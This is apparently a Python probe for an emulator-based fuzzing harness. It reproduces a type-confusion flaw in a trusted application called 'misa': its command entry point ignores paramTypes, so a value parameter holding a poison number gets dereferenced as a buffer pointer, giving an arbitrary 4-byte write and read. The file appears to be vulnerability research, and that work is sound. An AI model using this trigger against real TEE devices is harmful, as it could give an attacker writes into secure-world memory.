# GlobalConfusion dynamic probe for misa (123af5d1) — S19 reproduction.
#
# misa's TA_InvokeCommandEntryPoint @0x231B0 never checks paramTypes and uses
# params[1].memref.buffer for an arbitrary 4-byte WRITE (0x23200 str w8,[x22])
# and params[0].memref.buffer for an arbitrary READ (0x23204 ldr w5,[x23]),
# before any branch. We declare BOTH slots 0 and 1 as VALUE_INPUT and pass
# POISON as the value. The emulator writes a VALUE slot as [a:4][b:4][pad:8] at
# params+i*16 (params.py setup_params), so `params[i].memref.buffer` reads back
# as the 64-bit {a,b} = POISON. A correct (pinning/validating) TA would reject;
# misa derefs POISON -> UC_ERR_{WRITE,READ}_UNMAPPED @ ~POISON => S19 REPRODUCED.
#
# The WRITE (0x23200) executes before the READ (0x23204), so the FIRST fault is
# expected to be WRITE_UNMAPPED @ POISON (slot1). To observe the READ instead,
# set GC_WRITE_OK=1 to give slot1 a real mapped buffer (VALUE whose {a,b} we
# can't map; so instead pass slot1 as a small real MEMREF) — see env handling.
from .params import *
from qiling import Qiling
import os

CMD    = int(os.environ.get("GC_CMD", "0"), 0)
POISON = int(os.environ.get("GC_POISON", "0x4142434445"), 0)
# Which slots to poison as VALUE (default both 0 and 1 = the two deref sinks).
FLIP   = os.environ.get("GC_FLIP", "0,1")
FLIP_SLOTS = [int(x) for x in FLIP.split(",") if x != ""]
# paramTypes: nibble=1 (VALUE_INPUT) for each poisoned slot, 0 (NONE) otherwise.
# misa ignores paramTypes entirely, but we set the honest value the attacker
# would send (0x0011 for slots 0+1 = VALUE_INPUT) so the ABI is faithful.
PT = 0
for i in FLIP_SLOTS:
    PT |= (0x1 << (4 * i))
# Optional: GC_WRITE_OK=1 -> slot1 becomes a real mapped MEMREF so the WRITE at
# 0x23200 lands and execution proceeds to the READ at 0x23204 (isolate the read
# sink). slot0 stays poisoned.
WRITE_OK = "GC_WRITE_OK" in os.environ


def place_input_callback(ql: Qiling, input: bytes, _: int):
    print(f"[GC misa] CMD={CMD:#x} PT={PT:#06x} POISON={POISON:#x} "
          f"FLIP={FLIP_SLOTS} WRITE_OK={WRITE_OK}")
    params = [NoneParam(), NoneParam(), NoneParam(), NoneParam()]
    lo = POISON & 0xffffffff
    hi = (POISON >> 32) & 0xffffffff
    for i in FLIP_SLOTS:
        if i == 1 and WRITE_OK:
            params[i] = MemRefParam(bytes(0x40), 0x40)   # real buffer: write lands
        else:
            params[i] = ValueParam(lo, hi)               # poison the buffer slot
    pt = PT
    if WRITE_OK and 1 in FLIP_SLOTS:
        # slot1 nibble -> MEMREF_OUTPUT(6) for the real buffer
        pt = (pt & ~(0xF << 4)) | (0x6 << 4)
    setup_params_fuzz(ql, CMD, pt, params)
    return True
